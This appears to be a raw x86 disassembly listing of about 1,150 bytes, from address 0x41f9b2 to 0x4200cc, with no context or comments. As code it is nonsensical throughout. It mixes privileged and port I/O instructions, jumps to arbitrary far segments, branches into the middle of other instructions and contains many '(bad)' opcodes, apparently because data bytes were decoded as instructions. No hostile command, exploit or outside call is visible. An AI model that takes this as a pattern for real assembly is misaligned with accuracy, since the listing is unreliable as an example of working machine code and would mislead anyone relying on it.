  41f9b2:	lock sub al,BYTE PTR [eax+0x311af473]
  41f9b9:	inc    ebp
  41f9ba:	lods   al,BYTE PTR ds:[esi]
  41f9bb:	xor    DWORD PTR [edi-0x4b],eax
  41f9be:	gs jns 0x41f973
  41f9c1:	fucom  st(1)
  41f9c3:	stos   BYTE PTR es:[edi],al
  41f9c4:	in     eax,dx
  41f9c5:	jp     0x41f94f
  41f9c7:	push   edx
  41f9c8:	out    0x36,eax
  41f9ca:	imul   eax,DWORD PTR [eax],0xffa7c7b4
  41f9d0:	and    eax,0x744c818a
  41f9d5:	jmp    0x41fa22
  41f9d7:	das    
  41f9d8:	adc    bh,BYTE PTR ss:[edx-0x31497291]
  41f9df:	pop    esi
  41f9e0:	cli    
  41f9e1:	sbb    al,0x4c
  41f9e3:	int3   
  41f9e4:	mov    eax,0xf0f2aacb
  41f9e9:	or     eax,0x4133de24
  41f9ee:	sbb    BYTE PTR [edx],dh
  41f9f0:	mov    esi,0x2ec81116
  41f9f5:	mov    BYTE PTR [eax-0x1],ch
  41f9f8:	(bad)  
  41f9f9:	nop
  41f9fa:	or     bl,bh
  41f9fc:	sbb    al,0xd3
  41f9fe:	mov    dl,0xad
  41fa00:	cs adc edx,edi
  41fa03:	dec    ebx
  41fa04:	xchg   ecx,eax
  41fa05:	inc    eax
  41fa06:	lods   al,BYTE PTR ds:[esi]
  41fa07:	sbb    eax,esp
  41fa09:	add    esi,ebx
  41fa0b:	mov    ah,0x74
  41fa0d:	cwde   
  41fa0e:	pop    ss
  41fa0f:	cli    
  41fa10:	hlt    
  41fa11:	xchg   BYTE PTR [ebp+0x92532f4],ch
  41fa17:	fwait
  41fa18:	icebp  
  41fa19:	fwait
  41fa1a:	mov    edx,0x8b9ce72
  41fa1f:	or     dh,ah
  41fa21:	fsub   st(5),st
  41fa23:	lahf   
  41fa24:	out    0x24,eax
  41fa26:	pop    esi
  41fa27:	sahf   
  41fa28:	pop    edx
  41fa29:	outs   dx,DWORD PTR ds:[esi]
  41fa2a:	push   ecx
  41fa2b:	idiv   BYTE PTR [eax]
  41fa2d:	mov    ebp,0xc9576ed4
  41fa32:	mov    BYTE PTR [eax-0x4c81a193],bh
  41fa38:	sbb    eax,0xdcafe8e
  41fa3d:	jne    0x41f9f4
  41fa3f:	jns    0x41f9db
  41fa41:	sbb    DWORD PTR [esi+eiz*1-0x20],ecx
  41fa45:	ret    
  41fa46:	ja     0x41f9f8
  41fa48:	outs   dx,DWORD PTR ds:[esi]
  41fa49:	push   ebp
  41fa4a:	jbe    0x41fa8f
  41fa4c:	dec    esp
  41fa4d:	cmp    eax,0x242c51d
  41fa52:	in     al,0xe6
  41fa54:	shl    edi,1
  41fa56:	clc    
  41fa57:	imul   esi,DWORD PTR [ecx],0x2a363206
  41fa5d:	push   cs
  41fa5e:	cmp    eax,0x4c93b9c1
  41fa63:	push   edi
  41fa64:	jbe    0x41fa90
  41fa66:	inc    edx
  41fa67:	jns    0x41fa12
  41fa69:	(bad)  
  41fa6a:	dec    ebp
  41fa6b:	lds    edx,FWORD PTR ds:0xc65fa404
  41fa71:	sub    DWORD PTR [edx],esp
  41fa73:	js     0x41fa16
  41fa75:	mov    edx,0xf0ff8ccc
  41fa7a:	bound  esp,QWORD PTR [esi]
  41fa7c:	data16 jp 0x41fa66
  41fa7f:	inc    ebp
  41fa80:	outs   dx,DWORD PTR ds:[esi]
  41fa81:	mov    esp,0x16faaf8f
  41fa86:	sbb    al,0x1b
  41fa88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa89:	aas    
  41fa8a:	cmp    BYTE PTR [esi],ch
  41fa8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa8d:	ret    
  41fa8e:	jmp    0x9f001edd
  41fa93:	xchg   esp,eax
  41fa94:	jno    0x41faf7
  41fa96:	jge    0x41fae1
  41fa98:	sbb    al,0x8e
  41fa9a:	xchg   ebx,eax
  41fa9b:	xor    al,ch
  41fa9d:	ror    DWORD PTR [ebp-0x1b],1
  41faa0:	or     eax,0xf491a872
  41faa5:	adc    dl,bl
  41faa7:	dec    esp
  41faa8:	dec    esi
  41faa9:	add    DWORD PTR [eax+edx*8+0x3d],esp
  41faad:	dec    esp
  41faae:	pop    ss
  41faaf:	add    dl,BYTE PTR [eax+0x12]
  41fab2:	and    ebx,DWORD PTR [esi-0x45]
  41fab5:	imul   edi,eax,0x86400b39
  41fabb:	adc    al,0x9c
  41fabd:	fwait
  41fabe:	pop    ebp
  41fabf:	hlt    
  41fac0:	jns    0x41fb3f
  41fac2:	pop    esi
  41fac3:	mov    ebp,0xfe1aeab7
  41fac8:	jnp    0x41fa81
  41faca:	cmp    BYTE PTR ds:0x530a5b67,dl
  41fad0:	or     eax,0x827ebe2e
  41fad5:	adc    al,0xa8
  41fad7:	push   ecx
  41fad8:	inc    edi
  41fad9:	mov    WORD PTR [edi-0xae5f97f],cs
  41fadf:	lds    eax,FWORD PTR [ebp+0x6c]
  41fae2:	xlat   BYTE PTR ds:[ebx]
  41fae3:	fidivr WORD PTR [esp+ecx*2-0x9]
  41fae7:	pop    ecx
  41fae8:	add    BYTE PTR [eax],al
  41faea:	pop    eax
  41faeb:	dec    edx
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	mov    WORD PTR [ecx-0x75a32b6e],ss
  41fafc:	add    DWORD PTR [eax],eax
  41fafe:	xchg   BYTE PTR [esi],al
  41fb00:	add    BYTE PTR [eax],al
  41fb02:	push   0xccdbc42e
  41fb07:	add    ebx,DWORD PTR [ebx-0x1eb08eeb]
  41fb0d:	or     al,0xac
  41fb0f:	mov    ebx,0x54d06e4f
  41fb14:	sahf   
  41fb15:	inc    ecx
  41fb16:	mov    DWORD PTR [edx],ecx
  41fb18:	sbb    eax,0xdb49d635
  41fb1d:	cmp    edx,esp
  41fb1f:	adc    BYTE PTR [ecx+0x4c],ch
  41fb22:	outs   dx,DWORD PTR ds:[esi]
  41fb23:	xor    ecx,DWORD PTR [edi]
  41fb25:	cli    
  41fb26:	mov    DWORD PTR [eax],edx
  41fb28:	mov    BYTE PTR [eax],bh
  41fb2a:	leave  
  41fb2b:	das    
  41fb2c:	sbb    BYTE PTR [edi-0x1],cl
  41fb2f:	mov    bh,bl
  41fb31:	call   0x148:0x12ee56e0
  41fb38:	lods   eax,DWORD PTR ds:[esi]
  41fb39:	fild   QWORD PTR [eax]
  41fb3b:	push   ecx
  41fb3c:	jecxz  0x41fba9
  41fb3e:	gs call 0x2b65:0x56760c74
  41fb46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb47:	cwde   
  41fb48:	adc    DWORD PTR [esp+esi*2-0x7e],ebx
  41fb4c:	sub    al,al
  41fb4e:	mov    bh,0xff
  41fb50:	enter  0xdf65,0x4d
  41fb54:	push   esi
  41fb55:	loop   0x41fafc
  41fb57:	ins    DWORD PTR es:[edi],dx
  41fb58:	push   es
  41fb59:	ins    DWORD PTR es:[edi],dx
  41fb5a:	jmp    0x6009:0x819e2602
  41fb61:	jo     0x41fae7
  41fb63:	add    eax,eax
  41fb65:	jg     0x41fb0f
  41fb67:	lods   al,BYTE PTR ds:[esi]
  41fb68:	dec    edx
  41fb69:	sbb    eax,0x687ba4a8
  41fb6e:	out    dx,eax
  41fb6f:	pusha  
  41fb70:	cmp    dh,BYTE PTR [edx+0x0]
  41fb73:	and    esi,ebx
  41fb75:	pop    ebp
  41fb76:	push   cs
  41fb77:	popa   
  41fb78:	lods   al,BYTE PTR ds:[esi]
  41fb79:	dec    esi
  41fb7a:	inc    ebp
  41fb7b:	jecxz  0x41fb88
  41fb7d:	fcom   QWORD PTR [edi]
  41fb7f:	cs ret 
  41fb81:	daa    
  41fb82:	push   ebx
  41fb83:	pop    ebp
  41fb84:	xchg   esi,eax
  41fb85:	fild   DWORD PTR [edi+0x20a61791]
  41fb8b:	scas   al,BYTE PTR es:[edi]
  41fb8c:	push   esp
  41fb8d:	rol    DWORD PTR [ebx+0x5e],0x44
  41fb91:	jle    0x41fb42
  41fb93:	xchg   ecx,eax
  41fb94:	or     edi,DWORD PTR [eax-0x746cdeff]
  41fb9a:	stos   DWORD PTR es:[edi],eax
  41fb9b:	jns    0x41fbb7
  41fb9d:	dec    ebp
  41fb9e:	mov    ebx,0x15441ab4
  41fba3:	loope  0x41fbfa
  41fba5:	or     al,0x2a
  41fba7:	mov    edx,0xe60c0ecf
  41fbac:	jnp    0x41fc2b
  41fbae:	push   edi
  41fbaf:	sbb    eax,0xcff06ef2
  41fbb4:	aaa    
  41fbb5:	mov    edx,0x34c4cf40
  41fbba:	adc    eax,0xe9c952eb
  41fbbf:	pop    ecx
  41fbc0:	iret   
  41fbc1:	nop
  41fbc2:	cmp    al,0x9d
  41fbc4:	pop    eax
  41fbc5:	dec    edi
  41fbc6:	neg    BYTE PTR [esi-0x70a5002f]
  41fbcc:	and    eax,DWORD PTR [esi+0x6b0ab17]
  41fbd2:	rol    cl,0xfc
  41fbd5:	sbb    ebx,ebp
  41fbd7:	ja     0x41fb7f
  41fbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbda:	jg     0x41fc4d
  41fbdc:	push   es
  41fbdd:	mov    ebx,0x2ac5f452
  41fbe2:	pop    esp
  41fbe3:	mov    edi,0x36d1dc51
  41fbe8:	xlat   BYTE PTR ds:[ebx]
  41fbe9:	adc    cl,BYTE PTR [esi+0x11]
  41fbec:	scas   al,BYTE PTR es:[edi]
  41fbed:	(bad)  
  41fbee:	fimul  DWORD PTR [ebp+0x48]
  41fbf1:	aas    
  41fbf2:	loop   0x41fc04
  41fbf4:	pushf  
  41fbf5:	mov    al,ds:0xab04c95f
  41fbfa:	das    
  41fbfb:	outs   dx,DWORD PTR ds:[esi]
  41fbfc:	xchg   esi,eax
  41fbfd:	test   al,0x51
  41fbff:	inc    eax
  41fc00:	jmp    0x9000:0x857e4897
  41fc07:	jl     0x41fba4
  41fc09:	outs   dx,DWORD PTR ds:[esi]
  41fc0a:	popf   
  41fc0b:	dec    ebx
  41fc0c:	test   al,0xa4
  41fc0e:	sbb    esp,DWORD PTR [ecx+eiz*2]
  41fc11:	jmp    0x41fbb2
  41fc13:	cmp    al,0xdc
  41fc15:	mov    ebx,0x6056e704
  41fc1a:	sub    ch,BYTE PTR [esi]
  41fc1c:	or     dh,dh
  41fc1e:	xchg   ebp,eax
  41fc1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc20:	int3   
  41fc21:	add    ebx,DWORD PTR [edi]
  41fc23:	mov    eax,ds:0x93c5f225
  41fc28:	mov    DWORD PTR [edi-0x4b],ebp
  41fc2b:	pop    edx
  41fc2c:	mov    bl,0x67
  41fc2e:	lahf   
  41fc2f:	pop    ss
  41fc30:	idiv   DWORD PTR [edx]
  41fc32:	ret    0xc079
  41fc35:	push   0x4c
  41fc37:	repz add al,0xc7
  41fc3a:	fimul  DWORD PTR [edx+0x3706780e]
  41fc40:	push   esp
  41fc41:	dec    ecx
  41fc42:	les    ebp,FWORD PTR [edx-0x43]
  41fc45:	pop    ecx
  41fc46:	mov    ebx,0x95b2a66
  41fc4b:	stos   DWORD PTR es:[edi],eax
  41fc4c:	inc    esi
  41fc4d:	and    BYTE PTR [ebx+0x1c079454],bl
  41fc53:	sti    
  41fc54:	iret   
  41fc55:	imul   ebx,DWORD PTR [edi+edx*1],0x43
  41fc59:	dec    ebx
  41fc5a:	xchg   ebx,eax
  41fc5b:	in     al,dx
  41fc5c:	daa    
  41fc5d:	aas    
  41fc5e:	mov    ds:0x6e3495ce,eax
  41fc63:	nop
  41fc64:	add    al,0xb0
  41fc66:	sar    DWORD PTR [esi+0x22],0xdb
  41fc6a:	(bad)  
  41fc6b:	cwd    
  41fc6d:	pop    ss
  41fc6e:	out    0xbe,eax
  41fc70:	sahf   
  41fc71:	cwde   
  41fc72:	ret    
  41fc73:	gs xor al,0x7d
  41fc76:	jae    0x41fcb8
  41fc78:	repnz sub BYTE PTR [ecx],ah
  41fc7b:	push   cs
  41fc7c:	or     eax,0x5f634403
  41fc81:	fist   WORD PTR [edx+0x6f1a7def]
  41fc87:	dec    eax
  41fc88:	fwait
  41fc89:	mov    ebx,0x5fe125dd
  41fc8e:	les    ecx,FWORD PTR [edi+0x51]
  41fc91:	stc    
  41fc92:	hlt    
  41fc93:	cld    
  41fc94:	fstp   st(1)
  41fc96:	and    DWORD PTR [edx],edx
  41fc98:	mov    ch,0x7f
  41fc9a:	jns    0x41fc9a
  41fc9c:	aas    
  41fc9d:	mov    DWORD PTR [ecx+0x48],edi
  41fca0:	adc    DWORD PTR [edx-0x36],ebp
  41fca3:	gs pop ds
  41fca5:	stos   DWORD PTR es:[edi],eax
  41fca6:	fild   WORD PTR [edx+0x2a]
  41fca9:	cwde   
  41fcaa:	inc    esp
  41fcab:	cdq    
  41fcac:	mov    edi,0x9e32731f
  41fcb1:	call   0xb359:0xa76f53f6
  41fcb8:	dec    ecx
  41fcb9:	pop    eax
  41fcba:	shr    BYTE PTR [eax+0x6725e76],cl
  41fcc0:	bound  esi,QWORD PTR [edi+0x304cde89]
  41fcc6:	repnz or ecx,DWORD PTR [ecx+ebp*1+0x4c]
  41fccb:	mov    ecx,0xcb15d878
  41fcd0:	rcr    DWORD PTR [edx],0xda
  41fcd3:	hlt    
  41fcd4:	jmp    0xa22262f
  41fcd9:	shr    cl,1
  41fcdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcdc:	int    0xf0
  41fcde:	mov    ah,0xa3
  41fce0:	aas    
  41fce1:	mov    dh,BYTE PTR [edx]
  41fce3:	(bad)  
  41fce4:	xor    eax,0xf0a81165
  41fce9:	xor    eax,0x5989bad8
  41fcee:	nop
  41fcef:	mov    dh,0x94
  41fcf1:	xchg   DWORD PTR [eax],ebp
  41fcf3:	stos   BYTE PTR es:[edi],al
  41fcf4:	mov    ds:0xf5fa2a8a,eax
  41fcf9:	(bad)  
  41fcfa:	call   0xa53ed43a
  41fcff:	and    BYTE PTR [edi-0x11699b18],cl
  41fd05:	jns    0x41fd1b
  41fd07:	mov    bl,BYTE PTR [ebp+0x8]
  41fd0a:	arpl   WORD PTR [ebx+eiz*1-0x465c96ed],bx
  41fd11:	pop    ebp
  41fd12:	sbb    esi,edi
  41fd14:	add    bl,BYTE PTR [edx]
  41fd16:	stc    
  41fd17:	repnz mov eax,0x26671454
  41fd1d:	adc    edi,DWORD PTR [ecx]
  41fd1f:	and    esp,DWORD PTR [edx-0x11cc9e61]
  41fd25:	or     BYTE PTR [ecx+0x27],al
  41fd28:	arpl   bx,bp
  41fd2a:	ficomp WORD PTR [ecx]
  41fd2c:	add    eax,0x54732f21
  41fd31:	mov    DWORD PTR [esi],0xcf90858a
  41fd37:	bound  ebp,QWORD PTR [ebx]
  41fd39:	inc    esp
  41fd3a:	dec    edx
  41fd3b:	int3   
  41fd3c:	sub    eax,0x49dd4968
  41fd41:	sub    BYTE PTR [eax+esi*1],bl
  41fd44:	rcl    BYTE PTR [ecx-0x5a],cl
  41fd47:	out    0x28,al
  41fd49:	jg     0x41fd83
  41fd4b:	(bad)  
  41fd4c:	sbb    DWORD PTR [ebx],eax
  41fd4e:	bound  edx,QWORD PTR [ebp-0x67]
  41fd51:	sbb    dh,BYTE PTR [eax]
  41fd53:	jge    0x41fd21
  41fd55:	fdivr  QWORD PTR [esi-0x548169be]
  41fd5b:	xchg   ebx,eax
  41fd5c:	jns    0x41fd5d
  41fd5e:	outs   dx,DWORD PTR ds:[esi]
  41fd5f:	add    ch,BYTE PTR [esi-0x1b0edb04]
  41fd65:	cdq    
  41fd66:	and    eax,0x149fc5e6
  41fd6b:	dec    ebp
  41fd6c:	outs   dx,DWORD PTR ds:[esi]
  41fd6d:	pop    ebp
  41fd6e:	and    al,0x88
  41fd70:	xchg   esi,eax
  41fd71:	into   
  41fd72:	mov    esi,0x301fbf12
  41fd77:	adc    BYTE PTR [ebp-0x19],cl
  41fd7a:	mov    ah,0x2c
  41fd7c:	sti    
  41fd7d:	jnp    0x41fdcf
  41fd7f:	mov    esi,0xb7bd3b6f
  41fd84:	imul   eax,DWORD PTR [ecx-0x44dc2fcb],0xffffffba
  41fd8b:	xchg   ecx,eax
  41fd8c:	aas    
  41fd8d:	add    BYTE PTR [ebx],al
  41fd8f:	lock enter 0x64ea,0xaf
  41fd94:	mov    bl,0x6
  41fd96:	scas   al,BYTE PTR es:[edi]
  41fd97:	inc    esp
  41fd98:	lds    edx,FWORD PTR [eax]
  41fd9a:	daa    
  41fd9b:	aad    0x7
  41fd9d:	jge    0x41fd58
  41fd9f:	dec    ebx
  41fda0:	adc    eax,0xf1c646ad
  41fda5:	std    
  41fda6:	test   DWORD PTR [esi-0x27],0x785903cd
  41fdad:	mov    DWORD PTR [esi+0x6c0e8e38],ebx
  41fdb3:	or     eax,0xcf319a59
  41fdb8:	cmp    edx,DWORD PTR [ecx]
  41fdba:	ins    DWORD PTR es:[edi],dx
  41fdbb:	xor    eax,0x1ea6e4ff
  41fdc0:	shl    DWORD PTR [esi+0x0],0xd
  41fdc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdc5:	and    DWORD PTR [ebx],edx
  41fdc7:	std    
  41fdc8:	inc    ebx
  41fdc9:	lfs    eax,FWORD PTR [edx+0x2b797845]
  41fdd0:	cmp    eax,0xf74abfff
  41fdd5:	cmp    eax,esp
  41fdd7:	mov    bh,0x48
  41fdd9:	das    
  41fdda:	xor    bh,BYTE PTR [ecx+0x45c3f8f1]
  41fde0:	inc    ecx
  41fde1:	hlt    
  41fde2:	inc    ecx
  41fde3:	cmp    DWORD PTR [ebx-0x7d],edx
  41fde6:	cmp    DWORD PTR [esi-0x255f2fd],ecx
  41fdec:	xor    ah,BYTE PTR [ecx+0x4e]
  41fdef:	pop    ss
  41fdf0:	mov    ebp,0x61db473a
  41fdf5:	push   eax
  41fdf6:	ret    
  41fdf7:	inc    edi
  41fdf8:	clc    
  41fdf9:	inc    edx
  41fdfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdfb:	cmc    
  41fdfc:	xor    ebx,DWORD PTR [edx]
  41fdfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdff:	push   ebp
  41fe00:	mov    ah,ah
  41fe02:	inc    esp
  41fe03:	adc    BYTE PTR [ebp-0x71],dl
  41fe06:	cmp    ch,BYTE PTR [esi]
  41fe08:	fwait
  41fe09:	push   es
  41fe0a:	add    al,0x8e
  41fe0c:	int3   
  41fe0d:	and    DWORD PTR [esi-0x9dab8ca],ecx
  41fe13:	mov    eax,ds:0x6c710357
  41fe18:	cs retf 0x2d92
  41fe1c:	and    DWORD PTR [edi-0x3511b793],ebp
  41fe22:	ficom  DWORD PTR [eax+0x46]
  41fe25:	fwait
  41fe26:	xchg   ebp,eax
  41fe27:	adc    ah,0x74
  41fe2a:	jecxz  0x41fdff
  41fe2c:	mov    al,0xc
  41fe2e:	repnz fwait
  41fe30:	repnz xchg ebx,eax
  41fe32:	rol    esp,cl
  41fe34:	dec    esi
  41fe35:	das    
  41fe36:	mov    gs,WORD PTR [esi]
  41fe38:	hlt    
  41fe39:	xchg   ebp,eax
  41fe3a:	hlt    
  41fe3b:	sbb    BYTE PTR ds:0xddca889a,0xab
  41fe42:	int3   
  41fe43:	and    al,0x4a
  41fe45:	adc    ecx,DWORD PTR [ebx-0x56e6ea1c]
  41fe4b:	push   ebp
  41fe4c:	pop    es
  41fe4d:	lods   al,BYTE PTR ds:[esi]
  41fe4e:	xchg   ebp,eax
  41fe4f:	pop    eax
  41fe50:	shl    al,1
  41fe52:	sub    BYTE PTR [esp+edi*8+0x34],0x5d
  41fe57:	add    ebx,esi
  41fe59:	sbb    esi,edx
  41fe5b:	mov    ecx,0x4824c478
  41fe60:	push   es
  41fe61:	jno    0x41feb1
  41fe63:	xchg   esp,eax
  41fe64:	and    BYTE PTR [edi+edi*4],ch
  41fe67:	mov    WORD PTR [esi+0x7],?
  41fe6a:	mov    al,0x85
  41fe6c:	fnsave [edx-0x41]
  41fe6f:	xor    eax,0x8b022660
  41fe74:	not    DWORD PTR [edx-0x5197a3dc]
  41fe7a:	xor    eax,0xea735924
  41fe7f:	push   edx
  41fe80:	ret    
  41fe81:	sar    DWORD PTR [edx],cl
  41fe83:	xor    ah,BYTE PTR [esi-0x72]
  41fe86:	mov    dl,0x9f
  41fe88:	sub    DWORD PTR [edi-0x566878ce],edx
  41fe8e:	int3   
  41fe8f:	je     0x41fe3b
  41fe91:	in     eax,dx
  41fe92:	and    al,0xbe
  41fe94:	(bad)  
  41fe95:	loope  0x41fee7
  41fe97:	sahf   
  41fe98:	in     al,dx
  41fe99:	sti    
  41fe9a:	inc    eax
  41fe9b:	sub    BYTE PTR ds:0x57db0b5f,al
  41fea1:	mov    ds:0xa5635696,al
  41fea6:	jecxz  0x41feaf
  41fea8:	pushf  
  41fea9:	jbe    0x41feda
  41feab:	ss pop ss
  41fead:	xor    dh,dl
  41feaf:	or     BYTE PTR [esi+0x7a],dh
  41feb2:	stos   DWORD PTR es:[edi],eax
  41feb3:	mov    eax,0x34eb278f
  41feb8:	mov    bl,BYTE PTR [edx+0x55a2ad0c]
  41febe:	xor    bh,0x48
  41fec1:	(bad)  
  41fec2:	outs   dx,DWORD PTR ds:[esi]
  41fec3:	mov    DWORD PTR [ebx+esi*2],eax
  41fec6:	push   ebp
  41fec7:	xchg   eax,ebx
  41fec9:	jo     0x41fe59
  41fecb:	js     0x41ff07
  41fecd:	and    al,0xf6
  41fecf:	lods   al,BYTE PTR ds:[esi]
  41fed0:	jge    0x41ff4a
  41fed2:	test   eax,0x5fdbe16
  41fed7:	adc    al,0x6b
  41fed9:	push   ecx
  41feda:	mov    DWORD PTR [eax],esi
  41fedc:	test   DWORD PTR [edx+ecx*2],esi
  41fedf:	jecxz  0x41fe83
  41fee1:	nop
  41fee2:	ret    0x1d5b
  41fee5:	push   esi
  41fee6:	push   es
  41fee7:	jl     0x41fed2
  41fee9:	(bad)  
  41feea:	push   cs
  41feeb:	cmp    DWORD PTR [eax],0xfbab62fe
  41fef1:	pop    ebx
  41fef2:	jno    0x41fef8
  41fef4:	cmp    bl,cl
  41fef6:	aaa    
  41fef7:	push   ds
  41fef8:	test   BYTE PTR [edi-0x640ae9d8],0xf2
  41feff:	fsubr  st(3),st
  41ff01:	push   cs
  41ff02:	cli    
  41ff03:	push   esi
  41ff04:	rcl    DWORD PTR [eax+eiz*8-0x6e],cl
  41ff08:	push   cs
  41ff09:	sub    BYTE PTR [ebp+0x67],dl
  41ff0c:	push   cs
  41ff0d:	jmp    0x58d:0xc68adde9
  41ff14:	fwait
  41ff15:	and    BYTE PTR [esi+eiz*2-0x1ccd1500],0x7b
  41ff1d:	add    esi,DWORD PTR [ebx-0x50c6b0f6]
  41ff23:	call   0x6d0bb5df
  41ff28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff29:	ss mov ecx,0xf99dd03
  41ff2f:	rcl    BYTE PTR [ecx],0x20
  41ff32:	loope  0x41ff88
  41ff34:	inc    eax
  41ff35:	je     0x41fee8
  41ff37:	or     dh,BYTE PTR [edi+0x393f505a]
  41ff3d:	iret   
  41ff3e:	shl    BYTE PTR [ecx-0x25],0xc5
  41ff42:	iret   
  41ff43:	mov    DWORD PTR [ebx-0x5a],ecx
  41ff46:	jo     0x41ff84
  41ff48:	mov    bl,0xfd
  41ff4a:	mov    ebx,0x3a1483d7
  41ff4f:	pop    eax
  41ff50:	or     al,0xc
  41ff52:	addr16 pushf 
  41ff54:	cmp    ecx,DWORD PTR [ebx+edx*8+0x3f27d47a]
  41ff5b:	pop    esi
  41ff5c:	pop    edi
  41ff5d:	(bad)  [ebx+ecx*8]
  41ff60:	addr16 push es
  41ff62:	sbb    ch,BYTE PTR [edx]
  41ff64:	xor    bh,BYTE PTR [eax+0x34]
  41ff67:	shl    ch,1
  41ff69:	push   edx
  41ff6a:	loopne 0x41ffb6
  41ff6c:	adc    DWORD PTR [edx],0x6e
  41ff6f:	out    0xef,al
  41ff71:	and    eax,0x7c22c0ab
  41ff76:	stc    
  41ff77:	jbe    0x41ff8a
  41ff79:	jns    0x41ffba
  41ff7b:	dec    esp
  41ff7c:	and    eax,0xc2b8fb5
  41ff81:	push   ebx
  41ff82:	ss int3 
  41ff84:	(bad)  [edx+esi*8]
  41ff87:	add    al,0x25
  41ff89:	and    bl,BYTE PTR fs:[esp+edi*2-0x5a]
  41ff8e:	fistp  DWORD PTR [ebx]
  41ff90:	ins    BYTE PTR es:[edi],dx
  41ff91:	cld    
  41ff92:	xchg   edx,eax
  41ff93:	pop    esp
  41ff94:	xchg   esi,eax
  41ff95:	repz adc cl,cl
  41ff98:	mov    esi,0xf89ee1d
  41ff9d:	mov    eax,ds:0xa5a46cb
  41ffa2:	(bad)  
  41ffa3:	mov    edi,0xe7a628f8
  41ffa8:	imul   esi
  41ffaa:	sahf   
  41ffab:	inc    ecx
  41ffac:	data16 mov ah,0x13
  41ffaf:	inc    edi
  41ffb0:	xchg   DWORD PTR [ebx-0x4d],esp
  41ffb3:	inc    esi
  41ffb4:	daa    
  41ffb5:	dec    eax
  41ffb6:	div    DWORD PTR [esp+edx*2]
  41ffb9:	test   al,0xa8
  41ffbb:	push   ebp
  41ffbc:	(bad)  
  41ffbd:	or     al,0x72
  41ffbf:	ret    0x8203
  41ffc2:	push   es
  41ffc3:	and    dh,BYTE PTR [ecx]
  41ffc5:	mov    ecx,0x43fdb4aa
  41ffca:	cdq    
  41ffcb:	pop    esp
  41ffcc:	pop    ss
  41ffcd:	repz or ch,dh
  41ffd0:	retf   0x9d83
  41ffd3:	jae    0x41ffcf
  41ffd5:	sub    al,BYTE PTR [edx+ebp*8-0x6e]
  41ffd9:	(bad)  
  41ffda:	sar    DWORD PTR [ebp+edi*1-0x7],1
  41ffde:	mov    ch,0x87
  41ffe0:	and    BYTE PTR [esi],bh
  41ffe2:	push   esi
  41ffe3:	push   eax
  41ffe4:	or     bh,BYTE PTR [edx]
  41ffe6:	xchg   ecx,eax
  41ffe7:	test   ecx,ebp
  41ffe9:	mov    edx,0x98b6dc44
  41ffee:	lahf   
  41ffef:	xchg   ecx,eax
  41fff0:	xor    al,BYTE PTR [esi-0x33]
  41fff3:	jmp    0xee58:0xda5e3ec2
  41fffa:	ror    edi,cl
  41fffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fffd:	fwait
  41fffe:	adc    ah,bl
  420000:	jbe    0x420021
  420002:	jg     0x41ffd6
  420004:	push   esp
  420005:	xchg   esp,eax
  420006:	lods   al,BYTE PTR ds:[esi]
  420007:	retf   0xf202
  42000a:	call   0x78d40161
  42000f:	mov    dl,0x8c
  420011:	arpl   WORD PTR [edx],ax
  420013:	lahf   
  420014:	ficom  WORD PTR ds:0xce95003d
  42001a:	sbb    eax,0xa1c52e07
  42001f:	or     eax,0x81a0fc80
  420024:	pop    ebp
  420025:	cmp    ah,BYTE PTR [edi+0x16]
  420028:	mov    eax,0xa53bf1f5
  42002d:	sbb    bl,ah
  42002f:	and    DWORD PTR [eax-0x4721e394],0x5a
  420036:	popa   
  420037:	or     al,0x99
  420039:	arpl   WORD PTR [ecx],si
  42003b:	repz sbb eax,0x7ccf8945
  420041:	xchg   ebx,eax
  420042:	pop    ebx
  420043:	mov    ah,0x62
  420045:	mov    ch,0xbc
  420047:	jle    0x4200ad
  420049:	int    0x7d
  42004b:	pop    eax
  42004c:	scas   eax,DWORD PTR es:[edi]
  42004d:	(bad)
  420051:	iret   
  420052:	add    DWORD PTR [ebx+0x1e],edx
  420055:	pop    esp
  420056:	cmp    al,0x75
  420058:	jecxz  0x420029
  42005a:	lods   eax,DWORD PTR ds:[esi]
  42005b:	xor    al,0x24
  42005d:	mov    bh,0x88
  42005f:	or     al,0x6e
  420061:	ror    DWORD PTR [esi-0x12f77541],0xf7
  420068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420069:	stos   DWORD PTR es:[edi],eax
  42006a:	and    al,0x34
  42006c:	dec    edx
  42006d:	push   0xffffff92
  42006f:	mov    bl,0x2f
  420071:	push   ecx
  420072:	test   edi,ebx
  420074:	ret    
  420075:	or     DWORD PTR [edx+0x398cca05],edx
  42007b:	in     al,0x87
  42007d:	cmp    ebx,DWORD PTR [ebx+0x6d]
  420080:	or     eax,0x20ebcf88
  420085:	adc    al,0xf6
  420087:	mov    eax,ds:0x582224e0
  42008c:	cmp    eax,0x1591ee66
  420091:	xor    DWORD PTR [ebp+0x263b746a],eax
  420097:	or     edx,DWORD PTR fs:[esi]
  42009a:	dec    edx
  42009b:	jnp    0x420035
  42009d:	scas   eax,DWORD PTR es:[edi]
  42009e:	sbb    al,0x9d
  4200a0:	bound  esp,QWORD PTR fs:[edx]
  4200a3:	arpl   dx,dx
  4200a5:	fwait
  4200a6:	idiv   DWORD PTR [edx]
  4200a8:	xchg   BYTE PTR [ebx],dl
  4200aa:	jecxz  0x420097
  4200ac:	pop    esi
  4200ad:	fild   WORD PTR [ecx+0x27]
  4200b0:	sti    
  4200b1:	xor    ah,ch
  4200b3:	cld    
  4200b4:	xor    al,0x1c
  4200b6:	adc    edi,ebp
  4200b8:	or     edi,DWORD PTR [edi-0x2db63fc4]
  4200be:	pop    ds
  4200bf:	test   eax,0x90b77713
  4200c4:	mov    WORD PTR [eax],ds
  4200c6:	mov    edx,0xd449ffcb
  4200cb:	inc    edx
  4200cc:	push   es
